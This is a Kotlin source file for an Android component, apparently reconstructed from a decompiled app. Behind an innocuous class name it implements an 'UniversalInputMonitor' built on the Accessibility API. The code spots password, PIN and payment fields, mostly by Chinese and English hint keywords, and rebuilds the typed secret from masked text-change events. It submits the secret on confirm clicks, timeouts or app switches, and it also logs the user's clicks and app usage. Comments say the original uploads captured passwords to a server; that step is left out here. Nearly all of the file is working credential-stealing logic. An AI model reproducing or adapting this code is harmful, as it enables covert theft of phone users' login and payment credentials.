package com.storm.safe.rock.service.modules

import android.os.Handler
import android.os.HandlerThread
import android.os.Looper
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import java.util.Locale
import java.util.concurrent.ConcurrentHashMap
import java.util.concurrent.atomic.AtomicBoolean

/**
 * Universal input monitor that captures passwords from password fields.
 * Detects password fields via isPassword flag and hint text matching.
 *
 * Reverse-engineered from JADX: C0325b0 (b0, 939 lines).
 * Renamed: a0→submitPassword, a1→isMaskChar, a2→isAllMask,
 *          a3→isPasswordHint, a4→isAllMaskOrDot, a5→onAccessibilityEvent,
 *          a6→logActivity, a7→mergePasswordSnapshots, a8→resetTracking,
 *          a9→getAppName, b0→getHintText
 *
 * JADX name: UniversalInputMonitor
 */
class WriteSettingsPermDelegate(
    // vendor: holds dqtvuisjd service reference (f53147a0) for SharedPrefs and PackageManager access
) {
    companion object {
        private const val TAG = "UniversalInputMonitor"

        /** De-dup interval for TYPE_VIEW_TEXT_CHANGED events. JADX: 150ms check. */
        private const val TEXT_CHANGED_DEDUP_MS = 150L

        /** Auto-submit timeout posted on bgHandler. JADX: 3000ms delay. */
        private const val AUTO_SUBMIT_DELAY_MS = 3000L

        /** Max snapshots kept in snapshotList. JADX: 50. */
        private const val MAX_SNAPSHOTS = 50

        /** Mask/bullet characters used to detect password fields. JADX: f53146b6 */
        val MASK_CHARS = charArrayOf(
            '\u2022', // •
            '\u25CF', // ●
            '\u2B24', // ⬤
            '*',
            '\u25E6', // ◦
            '\u25CB', // ○
            '\u25C9', // ◉
            '\u2981', // ⦁ (U+2981)
            '\u2219', // ∙
            '\u26AC', // ⚬ (close)
            '\u00B7', // ·
            '\uFF0E', // ．
            '.',
            '\uFE52', // ﹒
            '\uFF0A', // ＊
            '\u2022', // • (repeat)
            '\u00B7'  // · (repeat)
        )

        /** Password-related hint keywords. Derived from JADX dh0 constants. */
        val PASSWORD_HINTS = listOf(
            "密码", "password", "passcode", "pin", "PIN码",
            "口令", "pay_pwd", "passwd", "security_code",
            "verification", "验证码", "支付密码", "登录密码",
            "交易密码", "锁屏密码"
        )

        /** Confirm button keywords. JADX: dh0.f55774c4 + dh0.f55778c8. */
        val CONFIRM_KEYWORDS = listOf(
            "确认", "确定", "登录", "登入", "支付", "付款",
            "完成", "下一步", "提交", "验证",
            "submit", "next", "continue", "login", "pay", "confirm"
        )

        /**
         * Check if a character is a mask/bullet. JADX: a1
         */
        @JvmStatic
        fun isMaskChar(c: Char): Boolean {
            if (c == '*') return true
            for (mask in MASK_CHARS) {
                if (mask == c) return true
            }
            return false
        }

        /**
         * Check if entire string is mask characters. JADX: a2
         */
        @JvmStatic
        fun isAllMask(str: String): Boolean {
            if (str.isEmpty()) return true
            for (c in str) {
                var found = false
                for (mask in MASK_CHARS) {
                    if (mask == c) { found = true; break }
                }
                if (!found) return false
            }
            return true
        }

        /**
         * Check if hint text indicates a password field. JADX: a3
         */
        @JvmStatic
        fun isPasswordHint(hint: String): Boolean {
            if (hint.isEmpty()) return false
            val lower = hint.lowercase(Locale.ROOT)
            for (keyword in PASSWORD_HINTS) {
                if (lower.contains(keyword.lowercase(Locale.ROOT))) return true
            }
            return false
        }

        /**
         * Check if string is all mask/dot characters (lenient). JADX: a4
         */
        @JvmStatic
        fun isAllMaskOrDot(str: String): Boolean {
            if (str.isEmpty()) return true
            var letterDigitCount = 0
            var maskCount = 0
            for (c in str) {
                if (Character.isLetterOrDigit(c)) letterDigitCount++
                if (isMaskChar(c) || c == '.' || c == '\uFF0E') maskCount++
            }
            return letterDigitCount <= 2 && maskCount >= str.length - 2
        }

        /**
         * Log to ActivityMonitor. JADX: a6
         */
        @JvmStatic
        fun logActivity(msg: String) {
            if (ActivityMonitor.appUsageEnabled || ActivityMonitor.textMonitorEnabled) {
                ActivityMonitor.writeToFile(ActivityMonitor.LogType.ACTZ, msg)
            }
        }

        /**
         * Merge multiple password snapshots into one by replacing '*' with real chars.
         * JADX: a7
         */
        @JvmStatic
        fun mergePasswordSnapshots(snapshots: ArrayList<String>): String? {
            if (snapshots.isEmpty()) return null
            var maxLen = 0
            for (s in snapshots) {
                if (s.length > maxLen) maxLen = s.length
            }
            if (maxLen == 0) return null
            val result = CharArray(maxLen) { '*' }
            for (s in snapshots) {
                for (i in s.indices) {
                    if (s[i] != '*') result[i] = s[i]
                }
            }
            val merged = String(result)
            return if (merged.contains('*')) null else merged
        }

        /**
         * Get hint text from AccessibilityNodeInfo. JADX: b0
         */
        @JvmStatic
        fun getHintText(node: AccessibilityNodeInfo): String {
            return try {
                if (android.os.Build.VERSION.SDK_INT >= 26) {
                    node.hintText?.toString()
                        ?: node.contentDescription?.toString()
                        ?: ""
                } else {
                    node.contentDescription?.toString() ?: ""
                }
            } catch (_: Exception) { "" }
        }

        /**
         * Check if string contains any mask character. JADX: inline in a0.
         */
        @JvmStatic
        fun hasMaskChar(str: String): Boolean {
            for (c in str) {
                if (isMaskChar(c)) return true
            }
            return false
        }

        /**
         * Check if string contains >= threshold Chinese characters.
         * JADX: inline in a0 (CJK Unified Ideographs range 0x4E00..0x9FFF).
         */
        @JvmStatic
        fun hasChinese(str: String, threshold: Int): Boolean {
            var count = 0
            for (c in str) {
                if (c.code in 0x4E00 until 0xA000) {
                    count++
                }
            }
            return count >= threshold
        }

        /**
         * Replace mask/bullet/dot characters with '*' for snapshot processing.
         * JADX: inline in s81 Runnable (text_changed handler).
         */
        @JvmStatic
        fun replaceMaskWithStar(text: String): String {
            if (text.isEmpty()) return ""
            val sb = StringBuilder(text.length)
            for (c in text) {
                var isMask = false
                for (mask in MASK_CHARS) {
                    if (mask == c) { isMask = true; break }
                }
                if (isMask || c == '.' || c == '\uFF0E' || c == '\u00B7' || c == '\uFE52' || c == '\uFF0A') {
                    sb.append('*')
                } else {
                    sb.append(c)
                }
            }
            return sb.toString()
        }

        /**
         * Trim leading non-alphanumeric characters from a snapshot string.
         * JADX: inline in s81 Runnable — skips chars until '*', digit, or letter is found.
         */
        @JvmStatic
        fun trimLeadingNonAlphanumeric(str: String): String {
            if (str.isEmpty()) return ""
            var i = 0
            while (i < str.length) {
                val c = str[i]
                if (c == '*' || Character.isDigit(c) ||
                    c in 'a'..'z' || c in 'A'..'Z') {
                    break
                }
                i++
            }
            return str.substring(i)
        }
    }

    // --- Instance fields (matching JADX field mapping) ---

    /** Background handler thread. JADX: HandlerThread in constructor. */
    private val bgThread = HandlerThread("UniversalInputMonitor-BG").also {
        it.isDaemon = true
        it.start()
    }

    /** Background handler for posting work off main thread. JADX: f53148a1. */
    private val bgHandler = Handler(bgThread.looper)

    /** App name cache: packageName → appName. JADX: f53149a2 (ConcurrentHashMap). */
    private val appNameCache = ConcurrentHashMap<String, String>()

    /** Current package being tracked. JADX: f53150a3. */
    private var currentPackage: String = ""

    /** Current app name being tracked. JADX: f53151a4. */
    private var currentAppName: String = ""

    /** Current field resource ID being tracked. JADX: f53152a5. */
    private var currentFieldId: String = ""

    /** Main tracking buffer for password chars. JADX: f53153a6. */
    private val trackingBuilder = StringBuilder()

    /** Confidence score (0-100). JADX: f53154a7. */
    private var confidence: Int = 50

    /** Whether currently tracking a password field. JADX: f53155a8. */
    @Volatile var isTracking: Boolean = false

    /** Snapshot list of masked password text. JADX: f53156a9. */
    private val snapshotList = ArrayList<String>()

    /** Plain text buffer from TYPE_VIEW_TEXT_CHANGED events. JADX: f53157b0. */
    private val eventPlainBuffer = StringBuilder()

    /** Timestamp of last processed text-change event. JADX: f53158b1. */
    @Volatile private var lastEventTime: Long = 0

    /** Auto-submit runnable posted with delay. JADX: f53159b2 (q81). */
    private val autoSubmitRunnable = Runnable { submitPassword("timeout") }

    /** Previous window package for app switch detection. JADX: f53160b3. */
    @Volatile private var prevWindowPkg: String = ""

    /** Whether SharedPrefs cache has been initialized. JADX: f53161b4. */
    private val cacheInitialized = AtomicBoolean(false)

    // --- a8 → resetTracking ---
    fun resetTracking() {
        trackingBuilder.setLength(0)
        currentPackage = ""
        currentAppName = ""
        currentFieldId = ""
        confidence = 50
        snapshotList.clear()
        eventPlainBuffer.setLength(0)
    }

    // --- a9 → getAppName ---
    fun getAppName(packageName: String): String {
        val cached = appNameCache[packageName]
        if (cached != null) return cached
        // vendor: loads SharedPreferences("app_name_cache") on first call via CAS guard (f53161b4),
        // then queries PackageManager.getApplicationInfo + getApplicationLabel for unknown packages,
        // caches result to both ConcurrentHashMap and SharedPreferences.
        val shortName = packageName.substringAfterLast(".")
        appNameCache[packageName] = shortName
        return shortName
    }

    // --- a0 → submitPassword (FULL VENDOR LOGIC) ---
    /**
     * Submit the tracked password for reporting. JADX: m211689a0.
     *
     * Logic:
     * 1. Get tracked text from trackingBuilder (trimmed)
     * 2. Try merge from snapshotList
     * 3. If tracked < 4 chars, fallback to eventPlainBuffer
     * 4. Determine which source to use based on mask detection
     * 5. Validate length (4..64)
     * 6. Reject all-mask passwords
     * 7. Reject passwords containing any mask char AND all-mask-or-dot
     * 8. Report valid password
     */
    fun submitPassword(reason: String) {
        if (!isTracking) return

        val tracked = trackingBuilder.toString().trim()
        val merged = mergePasswordSnapshots(snapshotList)

        // Step 1: Start with tracked or merged
        var password = if (merged != null && !merged.contains('*')) merged else tracked

        // Step 2: Fallback to eventPlainBuffer if password < 4 chars
        val plainText = eventPlainBuffer.toString().trim()
        if (password.length < 4 && eventPlainBuffer.length > 0) {
            password = plainText
        }

        // Step 3: Determine final password via mask analysis
        // JADX: checks if password has mask chars, and if plainText is valid alternative
        val passwordHasMask = hasMaskChar(password)
        val plainLen = plainText.length

        if (plainLen in 4..64) {
            // Check if plainText has mask chars
            val plainHasMask = hasMaskChar(plainText)
            if (!plainHasMask && !isAllMaskOrDot(plainText)) {
                // Plain text is clean — use it if password is dirty
                if (!passwordHasMask && !isAllMaskOrDot(password)) {
                    // Both clean — keep password
                } else if (!passwordHasMask && !hasChinese(password, 2)) {
                    // password has no mask but has Chinese chars
                } else {
                    password = plainText
                }
            }
            // If plain text has mask → stick with password
        }
        // else plainText out of range → keep password

        isTracking = false
        bgHandler.removeCallbacks(autoSubmitRunnable)

        // Step 4: Validate length
        if (password.length < 4 || password.length > 64) {
            resetTracking()
            return
        }

        // Step 5: Reject all-mask
        if (isAllMask(password)) {
            logActivity("密码输入: ${password.length}位 [${currentAppName}] (仅掩码/未拼全，已丢弃上报)")
            resetTracking()
            return
        }

        // Step 6: Reject if contains mask AND is all-mask-or-dot
        if (hasMaskChar(password) || isAllMaskOrDot(password)) {
            logActivity("密码输入: ${password.length}位 [${currentAppName}] (仅掩码/未拼全，已丢弃上报)")
            resetTracking()
            return
        }

        // Step 7: Valid password — compute display name
        val appName = currentAppName.trim()
        val displayName = if (appName.isNotEmpty()) {
            appName
        } else {
            val pkg = currentPackage
            val shortName = pkg.substringAfterLast(".").trim()
            if (shortName.isNotEmpty()) shortName else "未知应用"
        }

        Log.i(TAG, "🔑 捕获密码: app=$currentAppName pkg=$currentPackage type=$displayName " +
            "len=${password.length} conf=$confidence reason=$reason")
        logActivity("密码输入: ${password.length}位 [$currentAppName]")

        // vendor: uploads via coroutine AbstractC0385a0.m212471a0(UniversalInputMonitor$uploadPassword$1)
        // which sends password data (password, displayName, appName, packageName, confidence) to server.
        resetTracking()
    }

    // --- a5 → onAccessibilityEvent (FULL VENDOR LOGIC) ---
    /**
     * Process accessibility events for password monitoring. JADX: m211690a5.
     *
     * Handles event types:
     * - TYPE_VIEW_CLICKED (1): Log click, check for confirm button click
     * - TYPE_VIEW_FOCUSED (8): Detect password field focus
     * - TYPE_VIEW_TEXT_CHANGED (16): Track text input in password fields
     * - TYPE_WINDOW_STATE_CHANGED (32): Detect app switches
     */
    fun onAccessibilityEvent(event: AccessibilityEvent, rootNode: AccessibilityNodeInfo?) {
        val packageName = event.packageName?.toString()
        // vendor: checks if packageName equals service.getPackageName() — skip self events
        if (packageName.isNullOrEmpty()) return

        val eventType = event.eventType

        when (eventType) {
            // --- TYPE_VIEW_CLICKED (1) ---
            AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                handleViewClicked(event, packageName)
            }

            // --- TYPE_VIEW_FOCUSED (8) ---
            AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
                handleViewFocused(event, packageName)
            }

            // --- TYPE_VIEW_TEXT_CHANGED (16) ---
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                handleViewTextChanged(event, rootNode, packageName)
            }

            // --- TYPE_WINDOW_STATE_CHANGED (32) ---
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                handleWindowStateChanged(event, packageName)
            }
        }
    }

    // --- Internal event handlers ---

    /**
     * Handle TYPE_VIEW_CLICKED: log click activity, detect confirm button press.
     * JADX: case 1 in m211690a5 → r81 Runnable (switch case 1/default).
     */
    private fun handleViewClicked(event: AccessibilityEvent, packageName: String) {
        val textList = event.text
        val textJoined = if (!textList.isNullOrEmpty()) {
            textList.joinToString("") { it?.toString() ?: "" }
        } else ""
        val contentDesc = event.contentDescription?.toString() ?: ""

        if (textJoined.isEmpty() && contentDesc.isEmpty()) return

        bgHandler.post {
            // Log click activity
            val cachedName = appNameCache[packageName]
            val displayName = cachedName ?: packageName.substringAfterLast(".")
            val displayText = if (textJoined.isNotEmpty()) textJoined else contentDesc
            if (displayText.isNotEmpty()) {
                logActivity("点击: $displayText [$displayName]")
            }

            // Check for confirm button click while tracking
            if (isTracking) {
                val combined = "$textJoined $contentDesc".lowercase(Locale.ROOT)
                var isConfirmClick = false

                // Check confirm keywords
                for (keyword in CONFIRM_KEYWORDS) {
                    if (combined.contains(keyword.lowercase(Locale.ROOT))) {
                        isConfirmClick = true
                        break
                    }
                }

                // JADX also checks "submit", "next", "continue" as fallback
                if (!isConfirmClick) {
                    if (combined.contains("submit") || combined.contains("next") || combined.contains("continue")) {
                        isConfirmClick = true
                    }
                }

                if (isConfirmClick) {
                    submitPassword("confirm_click")
                }
            }
        }
    }

    /**
     * Handle TYPE_VIEW_FOCUSED: detect password field focus to start tracking.
     * JADX: case 8 in m211690a5.
     */
    private fun handleViewFocused(event: AccessibilityEvent, packageName: String) {
        val source = event.source ?: return
        try {
            val sourceIsPassword = source.isPassword
            val hintText = getHintText(source)
            val viewId = source.viewIdResourceName ?: ""

            if (sourceIsPassword || isPasswordHint(hintText)) {
                // Password field focused — start tracking
                bgHandler.post {
                    startTrackingField(packageName, viewId, if (sourceIsPassword) 4 else 3)
                }
            } else if (isTracking) {
                // Non-password field focused while tracking → auto-submit
                bgHandler.post {
                    submitPassword("focus_lost")
                }
            }
        } finally {
            // vendor: recycles source node; wrapped in try-catch for Robolectric compatibility
            try { source.recycle() } catch (_: Exception) {}
        }
    }

    /**
     * Handle TYPE_VIEW_TEXT_CHANGED: track text input in password fields.
     * JADX: case 16 in m211690a5 → s81 Runnable.
     * This is the core password tracking logic (~200 lines in JADX).
     */
    private fun handleViewTextChanged(event: AccessibilityEvent, rootNode: AccessibilityNodeInfo?, packageName: String) {
        // Get source node (from rootNode or event.source)
        val node: AccessibilityNodeInfo
        val shouldRecycle: Boolean
        if (rootNode != null) {
            node = rootNode
            shouldRecycle = false
        } else {
            val src = event.source ?: return
            node = src
            shouldRecycle = true
        }

        try {
            val nodeIsPassword = node.isPassword
            val hintText = getHintText(node)
            val isPasswordField = nodeIsPassword || isPasswordHint(hintText)

            // De-dup rapid text changes
            val now = System.currentTimeMillis()
            if (!isPasswordField && now - lastEventTime < TEXT_CHANGED_DEDUP_MS) {
                return
            }
            lastEventTime = now

            val viewId = node.viewIdResourceName ?: ""
            val nodeText = node.text?.toString() ?: ""
            val eventTextJoined = event.text?.let { list ->
                if (list.isNotEmpty()) list[0]?.toString() ?: "" else ""
            } ?: ""
            val beforeText = event.beforeText?.toString() ?: ""
            val addedCount = event.addedCount
            val removedCount = event.removedCount

            bgHandler.post {
                processTextChanged(
                    packageName = packageName,
                    viewId = viewId,
                    nodeIsPassword = nodeIsPassword,
                    hintText = hintText,
                    nodeText = nodeText,
                    eventText = eventTextJoined,
                    beforeText = beforeText,
                    addedCount = addedCount,
                    removedCount = removedCount
                )
            }
        } finally {
            if (shouldRecycle) {
                try { node.recycle() } catch (_: Exception) {}
            }
        }
    }

    /**
     * Handle TYPE_WINDOW_STATE_CHANGED: detect app switches for activity logging.
     * JADX: case 32 in m211690a5 → r81 Runnable (switch case 0).
     */
    private fun handleWindowStateChanged(event: AccessibilityEvent, packageName: String) {
        val className = event.className?.toString() ?: ""

        // Skip if same package, android framework, or androidx classes
        if (packageName == prevWindowPkg ||
            className.startsWith("android.") ||
            className.startsWith("androidx.")) {
            return
        }

        val previousPkg = prevWindowPkg
        prevWindowPkg = packageName

        bgHandler.post {
            // Submit password on app switch
            if (isTracking) {
                submitPassword("app_switch")
            }

            // Log activity
            val prevName = if (previousPkg.isNotEmpty()) getAppName(previousPkg) else ""
            val currentName = getAppName(packageName)

            if (prevName.isNotEmpty()) {
                logActivity("离开: $prevName")
            }
            logActivity("打开: $currentName")

            // Log page if className is a real activity (not inner class)
            val simpleName = className.substringAfterLast(".")
            if (simpleName.isNotEmpty() && !simpleName.contains('$') && simpleName != currentName) {
                logActivity("页面: $simpleName [$currentName]")
            }
        }
    }

    // --- Core processing methods ---

    /**
     * Process a text change event on the background thread.
     * JADX: s81 Runnable.run() inner logic.
     */
    private fun processTextChanged(
        packageName: String,
        viewId: String,
        nodeIsPassword: Boolean,
        hintText: String,
        nodeText: String,
        eventText: String,
        beforeText: String,
        addedCount: Int,
        removedCount: Int
    ) {
        val isHintMatch = !nodeIsPassword && isPasswordHint(hintText)
        if (!nodeIsPassword && !isHintMatch) return

        val appName = getAppName(packageName)

        // Get best non-mask text from sources
        var bestText = ""
        if (eventText.isNotEmpty() && !isAllMask(eventText)) {
            bestText = eventText
        } else if (nodeText.isNotEmpty() && !isAllMask(nodeText)) {
            bestText = nodeText
        } else if (beforeText.isNotEmpty() && !isAllMask(beforeText)) {
            bestText = beforeText
        } else {
            bestText = if (eventText.isNotEmpty()) eventText else nodeText
        }

        // Replace mask chars with '*' for snapshot processing
        val maskedNodeText = replaceMaskWithStar(nodeText)

        val baseConfidence = if (nodeIsPassword) 90 else 70

        // Handle case: no added or removed chars (initial password load or focus change)
        if (addedCount <= 0 && removedCount <= 0) {
            if (bestText.isEmpty() || isAllMask(bestText)) return

            if (isTracking && currentPackage == packageName && currentFieldId == viewId) {
                // Same field — reset and reload
                snapshotList.clear()
                eventPlainBuffer.setLength(0)
                trackingBuilder.setLength(0)
                trackingBuilder.append(bestText)
            } else {
                // New field
                if (isTracking) submitPassword("new_field")
                isTracking = true
                currentPackage = packageName
                currentAppName = appName
                currentFieldId = viewId
                confidence = baseConfidence
                snapshotList.clear()
                eventPlainBuffer.setLength(0)
                trackingBuilder.setLength(0)
                trackingBuilder.append(bestText)
            }

            bgHandler.removeCallbacks(autoSubmitRunnable)
            bgHandler.postDelayed(autoSubmitRunnable, AUTO_SUBMIT_DELAY_MS)
            return
        }

        // Handle incremental text changes
        if (!isTracking || currentPackage != packageName || currentFieldId != viewId) {
            // New field
            if (isTracking) submitPassword("new_field")
            isTracking = true
            currentPackage = packageName
            currentAppName = appName
            currentFieldId = viewId
            confidence = 40
            trackingBuilder.setLength(0)
            snapshotList.clear()
            eventPlainBuffer.setLength(0)
        }

        // Track removals: delete from plain buffer tail
        if (removedCount > 0) {
            val bufLen = eventPlainBuffer.length
            eventPlainBuffer.delete(maxOf(0, bufLen - removedCount), bufLen)
        }

        // Track additions: append printable chars to plain buffer
        if (addedCount > 0 && eventText.isNotEmpty()) {
            for (c in eventText) {
                if (Character.isLetterOrDigit(c) || "._-@#".contains(c)) {
                    eventPlainBuffer.append(c)
                }
            }
        }

        // Process masked snapshot
        if (maskedNodeText.isNotEmpty()) {
            val trimmed = trimLeadingNonAlphanumeric(maskedNodeText)
            if (trimmed.isNotEmpty()) {
                snapshotList.add(trimmed)
                while (snapshotList.size > MAX_SNAPSHOTS) {
                    snapshotList.removeAt(0)
                }
            }
        }

        // Update tracking builder from best source
        val merged = mergePasswordSnapshots(snapshotList)
        trackingBuilder.setLength(0)
        if (merged != null) {
            trackingBuilder.append(merged)
        } else if (eventPlainBuffer.isNotEmpty()) {
            trackingBuilder.append(eventPlainBuffer.toString())
        }

        // Reset auto-submit timer
        bgHandler.removeCallbacks(autoSubmitRunnable)
        bgHandler.postDelayed(autoSubmitRunnable, AUTO_SUBMIT_DELAY_MS)
    }

    /**
     * Start tracking a new password field (from FOCUS event).
     * @param confidenceMode 4 = isPassword flag, 3 = hint match
     */
    private fun startTrackingField(packageName: String, viewId: String, confidenceMode: Int) {
        if (isTracking && currentPackage == packageName && currentFieldId == viewId) {
            // Already tracking this field
            return
        }
        if (isTracking) {
            submitPassword("new_field")
        }
        isTracking = true
        currentPackage = packageName
        currentAppName = getAppName(packageName)
        currentFieldId = viewId
        confidence = if (confidenceMode == 4) 90 else 70
        trackingBuilder.setLength(0)
        snapshotList.clear()
        eventPlainBuffer.setLength(0)

        bgHandler.removeCallbacks(autoSubmitRunnable)
        bgHandler.postDelayed(autoSubmitRunnable, AUTO_SUBMIT_DELAY_MS)
    }

    fun dispose() {
        bgHandler.removeCallbacksAndMessages(null)
        bgThread.quitSafely()
    }
}
